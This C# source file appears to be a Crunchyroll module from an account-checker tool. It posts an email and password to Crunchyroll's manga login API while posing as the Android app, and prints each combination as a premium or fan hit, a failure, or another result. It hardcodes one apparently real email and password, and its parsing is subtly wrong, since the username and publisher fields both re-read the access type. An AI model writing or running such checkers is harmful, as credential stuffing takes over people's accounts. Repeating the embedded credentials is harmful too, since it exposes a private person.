using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Text.RegularExpressions;
namespace Fox.Configs
{
    internal class Crunchyroll
    {
        public static void crunchy()
        {
            string email = "rodriguezchendo@live.com.mx";
            string pass = "Chendo1990";

            using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
            {
                req.IgnoreProtocolErrors = true;
                req.AddHeader("Host", "api-manga.crunchyroll.com");
                req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                req.AddHeader("Accept-Encoding", "gzip, deflate");
                req.AddHeader("User-Agent", "okhttp/3.12.1");
                string payload = "device_type=com.crunchyroll.manga.android&device_id=e91480e2a8eb83af&access_token=FLpcfZH4CbW4muO&api_ver=1.0&account=" + email + "&password=" + pass + "";
                string send_data = req.Post("https://api-manga.crunchyroll.com/cr_login", payload, "application/x-www-form-urlencoded").ToString();
                if (send_data.Contains("\"access_type\":\"fan\"") | send_data.Contains("\"access_type\":\"premium\""))
                {

                    var access = Fox.Fuctions.Parsing.LR(send_data, "\"access_type\":\"", "\",");
                    string accessa = String.Join(", ", access);

                    var username = Fox.Fuctions.Parsing.LR(send_data, "\"access_type\":\"", "\",");
                    string usernamea = String.Join(", ", username);

                    var is_publisher = Fox.Fuctions.Parsing.LR(send_data, "\"access_type\":\"", "\",");
                    string is_publishera = String.Join(", ", is_publisher);
                    string capture = " + " + email + ":" + pass + " | Access = " + accessa + " | Username = " + usernamea + " | Is_Publisher = " + is_publishera;
                    Console.WriteLine(capture);
                }
                else if (send_data.Contains("{\"error\":true,\""))
                {
                    string capture = " - " + email + ":" + pass;
                    Console.WriteLine(capture);

                }
                else if (send_data.Contains("{\"data\":{\"user\":"))
                {
                    string capture = " / " + email + ":" + pass;
                    Console.WriteLine(capture);


                }    
    
            }




        }
    }
}
